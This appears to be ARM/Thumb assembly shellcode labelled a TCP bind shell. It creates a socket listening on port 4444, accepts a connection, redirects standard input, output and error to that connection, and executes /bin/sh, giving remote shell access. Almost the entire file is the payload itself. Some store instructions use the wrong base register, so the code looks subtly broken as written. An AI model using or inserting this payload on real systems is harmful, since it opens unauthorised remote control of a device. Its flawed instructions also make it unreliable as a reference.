@TCP bind_shell (ARM)

.section .text
.global _start
_start:
	.ARM
	ADD R3, PC, #1
	BX R3

	//SOCKET (0x900119, 281)
	.THUMB
	MOV R0, #2
	MOV R1, #1
	SUB R2, R2, R2
	MOV R7, #200
	ADD R7, #81
	SVC #1
	MOV R4, R0

	//BIND
	ADR R1, atk_box
	STRB R2, [R1, #1] //\x02\x00
	STRB R2, [R1, #4] //step thorugh by 1
	STRB R2, [R1, #5]
	STRB R2, [R2, #6]
	STRB R2, [R2, #7] //0.0.0.0
	MOV R2, #16 //block length
	ADD R7, #1 //bind
	SVC #1
	nop

	//LISTEN
	MOV R0, R4 //sock_id -> r0
	MOV R1, #2
	ADD R7, #2
	SVC #1

	//ACCEPT(INT, NULL, NULL)
	MOV R0, R4 
	SUB R1, R1, R1
	SUB R2, R2, R2
	ADD R7, #1 //0x90011e
	SVC #1
	MOV R4, R0 //return the sockid to R4

	//DUP2(SOCKID, 0)
	MOV R7, #63
	MOV R0, R4
	SUB R1, R1, R1 //stdin (0)
	SVC #1

	//DUP2(SOCKID, 1)
	MOV R7, #63
	MOV R0, R4
	ADD R1, #1 //stdout (1)
	SVC #1

	//DUP2(SOCKID, 2)
	MOV R7, #63
	MOV R0, R4
	ADD R1, #1 //stderr(2)
	SVC #1

	//EXECVE("/BIN/SH", 0, 0)
	ADR R0, shell
	EOR R1, R1, R1
	EOR R2, R2, R2
	STRB R2, [R0, #7] //'null'
	MOV R7, #11
	SVC #1
	nop

atk_box:
	.ascii "\x02\xff"
	.ascii "\x11\x5c"
	.byte 1,1,1,1
shell:
	.ascii "/bin/shX"
